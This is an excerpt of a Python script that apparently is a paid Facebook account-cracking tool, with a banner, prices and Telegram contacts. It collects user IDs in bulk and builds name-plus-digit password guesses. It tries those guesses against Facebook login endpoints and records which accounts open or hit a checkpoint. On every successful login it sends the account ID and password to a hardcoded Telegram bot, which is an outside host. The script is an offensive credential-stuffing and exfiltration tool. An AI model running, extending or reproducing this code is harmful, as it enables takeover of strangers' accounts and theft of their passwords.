...
\__$$  __|$$  __$$\ $$  _____|$$$\    $$$ |      $$$$ | $$  __$$\ $$  __$$\ $$  __$$\ 
   ...
   $$ |   $$ |  $$ |$$ |      $$ |\$  /$$ |        $$ | $$ /  $$ |$$ /  $$ |$$ /  $$ |
   $$ |   $$ |  $$ |$$$$$$$$\ $$ | \_/ $$ |      $$$$$$\ $$$$$$  | $$$$$$  | $$$$$$  |
   \__|   \__|  \__|\________|\__|     \__|      \______|\______/  \______/  \______/ 
                                                                                      
                                   
≜ AUTHOR ≵ ≽ JG_HAMA BY shaba_shelbe 
≜ Github ≵ ≽ HAMA_nekom
≜ TELEGRAM ≫ ≽ @JG_HAMA ≗ @shaba_shelbe 
≜ NRXE ≫ TOOL 5$ 1≭MANG
≜ NRXE ≫ TOOL 10$ 3≭MAN''')                                      
def DYNO():
	try:
...
def menu(my_name,my_id):
	...
	print('')
	print('')
	print('\x1b[1;91m[ 1 ] CRACK PUBLIC \033[33m[ \033[32mON \033[33m]')
	print('')
	print('\x1b[1;91m[ 2 ] CRACK FILE \033[33m[ \033[32mON \033[33m]')
	print('')
	print('\x1b[1;91m[ 0 ] REMOVIE COOKIE ')
	print('')
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		File2()
	elif _____alvino__adijaya_____ in ['30']:
		result()
	elif _____alvino__adijaya_____ in ['40']:
	    cek_opsi()
...
def result():
	...
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;91mHasil Akun OK \33[m(\x1b[1;92mOK\33[m) \x1b[1;91mAnda ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m CHAND ID DAWE  ? > \x1b[1;93m  '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m ≺ID DANE≻ '+str(yz)+' > \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m3.  ≪ALL📁FB≫ ')
	print('')
	...
	if hu in ['1','01']:
		...
		exit()
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m1. Mobile \33[m(\x1b[1;93mapi.facebook.com\33[m) \33[m[\x1b[1;92m FAST BEST DATA \33[m]')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m4. Mbasic \33[m(\x1b[1;93mm.facebook.com\33[m) \33[m[\x1b[1;92mDATA MOBILE\33[m]')
	print('')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92mSHOW THE APP \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
	if _jembot_ in ['']:
		print('\033[32mAUTO PASSWORD [ T ] ')
		back()
	elif _jembot_ in ['1','01']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('\033[32mAUTO PASS [ T ] ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
≜ NRXE ≫ TOOL 10$ 3≭MAN''')                                                                                                       
   ...
   \x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ≫\x1b[1;92m[+] ≫𝛿😂 AWJA WARA HATA KRACK DAKA {K}1k{x} {b}Idz          
\033[92m """)
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+frs+"1235")
					pwv.append(frs+frs+"1236")
					pwv.append(frs+frs+"0750")
					pwv.append(frs+"123")
					pwv.append(frs+"0750")
					pwv.append(frs+"0770")
					pwv.append(frs+"0780")
	...
	print(f'[{b}•{b}]{b} OK : {h}%s '%(ok))
	print(f'{k}[{k}•{k}]{k} CP : {m}%s{m} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r 【CARCK BY xHAMAx】 {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{k}{len(id)}{P}] 🔥 {P}{B}OK 🔥 {ok}{P} 🔥 {P}\033[1;31mCP 🔥 {cp}{x} 🔥 {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[31m[📡] JG-𝐂𝐏-𝐈𝐃 ☛ {idf} [📡] JG-𝐂𝐏-𝐏𝐀𝐒𝐒 ☛ {pw}')     
				...
				print(f'\r\x1b[32m🔥 JG-𝐎𝐊-𝐈𝐃 ∗ {idf} 🔥 HAMA1666-𝐏𝐀𝐒𝐒 ∗ {pw}')
				requests.get(f"https://api.telegram.org/bot5617949676:AAEICxrc4AIvVorytiStP643BgQwZwWSes0/sendMessage?chat_id=1969704499&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 OK \n➳ Email : {idf} \n│   ⊛  PASS  : {pw}  ")
